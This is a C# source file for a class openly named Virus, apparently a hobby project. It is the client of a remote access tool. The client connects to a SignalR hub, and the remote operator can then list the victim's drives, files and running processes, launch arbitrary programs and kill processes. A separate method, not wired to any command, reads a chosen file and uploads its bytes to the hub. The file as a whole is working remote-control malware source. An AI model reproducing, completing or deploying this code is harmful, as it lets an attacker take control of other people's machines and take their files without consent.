using Microsoft.AspNetCore.SignalR.Client;
using Newtonsoft.Json;
using SerializableObjectsLibrary;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace VirusClient.Models
{
    public class Virus
    {
        private readonly Uri _hubPath;
        private readonly HubConnection _hubConnection;

        public Virus(Uri hubPath)
        {
            _hubPath = hubPath;

            _hubConnection = new HubConnectionBuilder()
                .WithUrl(_hubPath)
                .WithAutomaticReconnect()
                .Build();

            _hubConnection.On<string>("OnGetDrives", OnGetDrives);
            _hubConnection.On<string, string>("OnGetFiles", OnGetFiles);

            _hubConnection.On<string>("OnGetRunningProcesses", OnGetRunningProcesses);
            _hubConnection.On<string, string>("OnStartProcess", OnStartProcess);
            _hubConnection.On<string, string>("OnAbortProcess", OnAbortProcess);
        }

        private async Task OnGetRunningProcesses(string callerId)
        {
            List<string> processes = Process.GetProcesses().Select(p => p.ProcessName).ToList();
            await _hubConnection.InvokeAsync("SendRunningProcessesToCaller", callerId, processes);
        }

        public async Task StartAsync()
        {
            await _hubConnection.StartAsync();
            Console.WriteLine("Hello");
            Console.WriteLine(_hubConnection.ConnectionId);
            Console.WriteLine(_hubConnection.State);
        }

        public async Task StopAsync() =>
            await _hubConnection.StopAsync();
        private async Task NotifyCallerAsync(string callerId, string message, MessageType messageType) =>
            await _hubConnection.InvokeAsync("Notify", callerId, $"{messageType}: {message}");

        private async Task OnDownloadFile(string callerId, string filePath)
        {
            byte[] buffer = await File.ReadAllBytesAsync(filePath);

            await _hubConnection.InvokeAsync("DownloadFile", callerId, buffer);

            await File.WriteAllBytesAsync("newFilePath", buffer);
        }

        private async Task OnGetDrives(string callerId)
        {
            List<string> drives = DriveInfo.GetDrives().Select(d => d.Name).ToList();
            await _hubConnection.InvokeAsync("SendDrivesToCaller", callerId, drives);
        }

        private async Task OnGetFiles(string callerId, string directoryPath)
        {
            List<string> allFiles = new List<string>();

            allFiles.AddRange(Directory.GetFiles(directoryPath));
            allFiles.AddRange(Directory.GetDirectories(directoryPath));

            await _hubConnection.InvokeAsync("SendFilesToCaller", callerId, allFiles);
        }

        private async Task OnStartProcess(string callerId, string processPath)
        {
            try
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo(processPath) { UseShellExecute = true };
                Process.Start(processStartInfo);

                await NotifyCallerAsync(callerId, $"SUCCESS: files {processPath} opened successfully", MessageType.Success);
            }
            catch (Exception ex)
            {
                await NotifyCallerAsync(callerId, ex.Message, MessageType.Error);
            }
        }

        private async Task OnAbortProcess(string callerId, string processName)
        {
            try
            {
                var processes = Process.GetProcessesByName(processName);

                foreach (var process in processes)
                    process.Kill();

                await NotifyCallerAsync(callerId, $"process {processName} completed successfully", MessageType.Success);
            }
            catch (Exception ex)
            {
                await NotifyCallerAsync(callerId, ex.Message, MessageType.Error);
            }
        }
    }
}
